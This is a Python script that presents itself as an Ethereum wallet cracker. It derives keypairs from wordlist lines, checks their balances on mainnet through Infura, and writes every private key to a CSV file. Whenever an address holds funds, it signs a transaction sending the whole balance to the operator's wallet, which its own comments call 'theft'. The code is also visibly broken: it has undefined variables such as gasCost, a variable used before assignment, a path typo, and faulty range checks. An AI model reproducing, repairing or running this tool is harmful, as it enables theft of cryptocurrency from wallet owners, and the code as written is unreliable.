#!/usr/bin/env python3

import os, sys, csv, eth_utils
from web3 import Web3
from eth_account.account import Account
from configparser import ConfigParser
from sys import getsizeof

VERBOSITY_NONE = 0
VERBOSITY_LOW = 1
VERBOSITY_MEDIUM = 2
VERBOSITY_HIGH = 3

# Set or check the values in the config file
def checkConfig():
	global entropySourceDirectory
	global dbFileLocation
	global ourControlledWallet
	global maxGasPerTx
	global marginOfSafety
	global preferredPriorityFee
	global connectionUrl
	global verbosity

	configFileName = ".ewcconfig"
	configFile = os.path.expanduser('~') + "/" + configFileName
	print("[INFO] Checking for presence of config file at: \'" + configFile + "\'")
	cfg = ConfigParser()
	if not os.path.exists(configFile):
		print("[ERROR] Config file not present in current user's home directory!")
		print("[INFO] Collecting input now ...\n")
		
		print("   1) Enter your entropy source directory:\n\t(Default: \'/usr/share/wordlists/\')")
		entropySourceDirectory = str(input("\tSource directory: "))
		if not entropySourceDirectory:
			entropySourceDirectory = "/usr/share/wordists/"
			
		print("   2a) Enter a CSV filename to store generated keypairs:\n\t(Default: \'keys.csv\')")
		dbFileName = str(input("\tFilename: "))
		if not dbFileName:
			dbFileName = "keys.csv"
			
		print("   2b) Enter a directory to save the CSV file in:\n\t(Default: \'" + dbFileLocation + "\')")
		dbFileLocation = os.path.expanduser('~') + "/Desktop/" 
		dbTempFileLocation = str(input("\tLocation: "))
		if dbTempFileLocation:
			dbFileLocation = dbTempFileLocation
		dbFileLocation += dbFileName
		
		print("   3) Enter the public address of the Ethereum wallet to send discovered funds to: ")
		ourControlledWallet = str(input("\tAddress: "))
		if not ourControlledWallet:
			print("\t[ERROR] This needs to be set before you get any funds deposited. Be sure to update this later.")

		print("   4) Enter the maximum gas cost you want to pay for transactions:\n\t0 =  dynamically generate based on current market conditions\n\t(Default: 0)")
		maxGasPerTx = input("\tMax gas: ")
		if not maxGasPerTx:
			maxGasPerTx = 0
		maxGasPerTx = int(maxGasPerTx)
		if (maxGasPerTx < 0):
			maxGasPerTx = 0
			print("\t[ERROR] Max gas has to be a positive number, defaulting to 0")

		print("   5) Enter the percentage above the market-rate gas fee you are willing to pay:\n\t(0-100, 0 = No priority, 100 = 2x market rate)\n\t(Default: 0)")
		marginOfSafety = input("\tMargin of safety: ")
		if not marginOfSafety:
			marginOfSafety = 0
		marginOfSafety = int(marginOfSafety)
		if marginOfSafety not in range(0,100):
			maxGasPerTx = 0
			print("\t[ERROR] The margin of safety must be between 0 and 100, defaulting to 0")

		print("   6) Enter your preferred priority fee:\n\t(This goes to Ethereum miners; default: 4)")
		preferredPriorityFee = input("\tPriority fee: ")
		if not preferredPriorityFee:
			preferredPriorityFee = 4
		preferredPriorityFee = int(preferredPriorityFee)
		if (preferredPriorityFee < 0):
			preferredPriorityFee = 4
			print("\t[ERROR] The priority fee has to be a positive number, defaulting to 4")

		print("   7) Enter your Infura API key: ")
		infuraKey = str(input("\tInfura key: "))
		if not infuraKey:
			print("\t[ERROR] This needs to be set before the program will run. Be sure to update this later.")

		print("   8) Are you using HTTP or WebSockets (wss)?\n\t(Choose HTTP if you don't know)\n\t(Default: \'HTTP\'")
		connectionUrlSelection = str(input("\tConnection type: ")).lower()
		if "wss" in connectionUrlSelection:
			connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey
		else:
			connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey

		print("   9) Enter your preferred verbosity:\n\t0 = Essential details only\n\t1 = Per-input-file updates\n\t2 = Per-entropy-input updates\n\t3 = Per-address updates (most verbose)\n\t(Default: 0)")
		verbosity = input("\tVerbosity: ")
		if not verbosity:
			verbosity = VERBOSITY_NONE
		verbosity = int(verbosity)
		if verbosity not in range(VERBOSITY_NONE, VERBOSITY_HIGH):
			verbosity = VERBOSITY_LOW
			print("\t[ERROR] Verbosity has to be 0-3, defaulting to 1 ...")

		cfg["ETHWALLETCRACKERSETTINGS"] = {
			"entropySourceDirectory": entropySourceDirectory,
			"dbFileLocation": dbFileLocation,
			"ourControlledWallet": ourControlledWallet,
			"maxGasPerTx": maxGasPerTx,
			"marginOfSafety": marginOfSafety,
			"preferredPriorityFee": preferredPriorityFee,
			"connectionUrl": connectionUrl,
			"verbosity": verbosity
		}
		with open(configFile, 'w+') as conf:
			cfg.write(conf)
		print("[SUCCESS] Information saved in the configuration file: \n\t\'" + configFile + "\'\nPlease make any further changes or fixes to your configuration file manually within the file itself.\n")
	else:
		print("[INFO] Config file found, pulling relevant data ...")
		cfg.read(configFile)
		cfgSettingsData = cfg["ETHWALLETCRACKERSETTINGS"]
		entropySourceDirectory = str(cfgSettingsData["entropySourceDirectory"])
		dbFileLocation = str(cfgSettingsData["dbFileLocation"])
		ourControlledWallet = str(cfgSettingsData["ourControlledWallet"])
		maxGasPerTx = int(cfgSettingsData["maxGasPerTx"])
		marginOfSafety = int(cfgSettingsData["marginOfSafety"])
		preferredPriorityFee = int(cfgSettingsData["preferredPriorityFee"])
		connectionUrl = str(cfgSettingsData["connectionUrl"])
		verbosity = int(cfgSettingsData["verbosity"])

# Connect to the APIs so we can interact with the Ethereum blockchain
def connect(connectionUrl):
	print("[INFO] Connecting to Ethereum mainnet ...")
	try:
		if (connectionUrl.startswith('wss')): # Websockets
			web3Instance = Web3(Web3.WebsocketProvider(connectionUrl))
		else: # HTTP(S)
			web3Instance = Web3(Web3.HTTPProvider(connectionUrl))
	except:
		sys.exit("[ERROR] There was an error with connecting to the Infura APIs. Check your API key and the config file for issues.")
	# Double check our connection works
	if not web3Instance.isConnected():
		sys.exit("[ERROR] Cannot connect to given URL. Please verify the correctness of the URL and if the site is online.")
	return web3Instance

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance in Wei']
	data = [pubKey, privKey, balance]
	try:
		with open(dbFileLocation, 'a+', encoding='UTF8', newline='') as dbFile:
			writer = csv.writer(dbFile)
			writer.writerow(data)
	except:
		sys.exit("[ERROR] There was an error saving data to the CSV file. Check the config file to ensure your direc")

# Use the 'entropy' parameter to create an account
def generateAddress(entropy):
	try:
		tempAcct = Account.create(extra_entropy=entropy)
	except: 
		sys.exit("[ERROR] There was an an issue creating a wallet with this entropy input.")
	pubKey = tempAcct.address # Public key/address
	privKey = tempAcct.key # Private key
	return pubKey, privKey

# The actual cracking and theft
def findANonZeroBalance(entropy):
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)
	if (verbosity >= VERBOSITY_HIGH):
		print("[INFO] Generated address: " + pubKey + " , testing for balances ...")
	
	# Balance is returned in wei
	balance = web3Instance.eth.getBalance(pubKey)
	
	# Save relevant data
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0): # 1 in 2^256 chance this condition is true
		print("[SUCCESS] Balance of " + web3.fromWei(balance, 'ether') + " ETH found in " + pubKey)
		nonce = web3Instance.eth.getTransactionCount(pubKey, 'latest')
		
		# Calculate gas costs (EIP-1559 compliant)
		baseFee = int(maxGasPerTx)
		if not baseFee:
			baseFee = web3Instance.eth.getBlock("pending").baseFeePerGas
		priorityFee = web3Instance.toWei(preferredPriorityFee, 'gwei')
		marginOfSafety = 1.0 + float(marginOfSafety / 100)
		maxFee = web3.toWei(int(((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
		
		# Generate a send-to-us transaction
		tx = {
			'from': pubKey,
			'nonce': nonce,
			'to': ourControlledWallet,
			'value': balance,
			'gas': gasCost,
			'maxFeePerGas': maxFee,
			'maxPriorityFeePerGas': priorityFee
		}

		# Try to send the transaction
		try:
			signed_tx = web3Instance.eth.account.signTransaction(tx, privKey)
			tx_hash = web3Instance.eth.sendRawTransaction(signed_tx.rawTransaction)
			print("[SUCCESS] " + web3Instance.fromWei(balance, "ether") + " Ether transferred from " + pubKey + " to us in tx " + web3Instance.toHex(tx_hash))
		except:
			sys.exit("[ERROR] There was an error transferring funds. Consider taking the private key and importing into Metamask to complete the transaction manually (Private key: \'" + privKey + "\').")

# Main function
def main():
	# Set or check the values in the config file
	checkConfig()

	# Check the API connection
	global web3Instance
	web3Instance = connect(connectionUrl)

	print("[INFO] Generating keys, this will take a while ...")
	# Open up our source of entropy
	for sourceFile in os.listdir(entropySourceDirectory):
		if (verbosity >= VERBOSITY_LOW):
			print("[INFO] Pulling entropy from \'" + str(sourceFile) + "\' ... ")
		try:
			lines = open(entropySourceDirectory + "/" + sourceFile, 'r').readlines()
		except:
			print("[ERROR] Unknown issue opening file \'" + str(sourceFile) + "\', moving to next file ... ")
			continue
		for textLine in lines:
			# Get the line from the file and format it for our Ethereum tools
			try:
				tempLine = str(textLine).strip()
			except:
				print("[ERROR] Unknown issue with line \'" + str(textLine) + "\', discarding ... ")
				continue
			if (verbosity >= VERBOSITY_MEDIUM):
				print("[INFO] Conducting permutations on line \'" + tempLine + "\' ... ")
			tempLine = bytes(tempLine, 'utf-8')

			# Generate address permutations
			tempLineByteLength = getsizeof(tempLine)

			# Do basic entropy permutations
			# Only allowed keylengths are defined in BIP39 
			for maxByteLength in [128, 160, 192, 224, 256]:
				# Too long, just use the first or last maxByteLength bytes
				if (tempLineByteLength > maxByteLength):
					# First maxByteLength bytes
					findANonZeroBalance(tempLine[:maxByteLength])

					# Last maxByteLength bytes
					findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:])

				# Edge case - line doesn't exist or isn't working
				elif (tempLineByteLength < 0):
					findANonZeroBalance('')

				# Proper length entropy
				else:
					pad = maxByteLength - tempLineByteLength

					# Pad on the left
					findANonZeroBalance(bytes(pad) + tempLine)
			
					# Pad on the right
					findANonZeroBalance(tempLine + bytes(pad))

					# Pad 50/50 Left/Right split
					findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)))
				
	print("[INFO] Keygen complete, keypair details are located at:\n\t\'" + dbFileLocation + "\'")

# We're invoking the program directly and not via importation
if __name__=="__main__":
    main()
